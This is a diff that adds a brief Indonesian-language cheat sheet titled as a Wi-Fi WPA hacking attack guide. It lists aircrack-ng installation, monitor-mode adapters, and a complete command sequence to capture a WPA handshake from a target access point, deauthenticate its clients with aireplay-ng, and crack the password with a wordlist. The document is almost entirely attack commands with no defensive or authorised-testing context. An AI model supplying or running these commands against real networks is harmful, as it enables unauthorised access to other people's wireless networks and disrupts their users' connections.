@@ -1,0 +1,27 @@
+(root)
+INFO (tools-network-wifi) :
+  |__ hacking attack wifi wpa
+
+COMMAND INSTALL :
+- $ sudo apt install aircrack-ng
+
+JENIS USB WIFI ADAPTER SUPPORT (mode monitor) :
+- Alfa AWUSO36NH
+- Alfa AWUS036NHA
+- Realtek RTL8812AU
+
+COMMAND HACKING :
+- $ sudo airmon-ng wlan0
+  |__ ubah wifi adapter mode monitor berganti wlan0mon
+
+- $ sudo airodump-ng wlan0mon
+  |__ scan detail lalu lintas jaringan wifi sekitar
+
+- $ sudo airodump-ng --channel 2 --bssid 40:45:DA:06:C1:D9 --write keyfind.txt wlan0mon
+  |__ monitor for get handshake key encryption
+
+- $ sudo aireplay-ng --deauth 50 -a 40:45:DA:06:C1:D9 wlan0mon
+  |__ attack for restart authentication
+
+- $ aircrack-ng keyfind-01.cap -w ~/filewordlist.txt
+  |__ hack for get key password
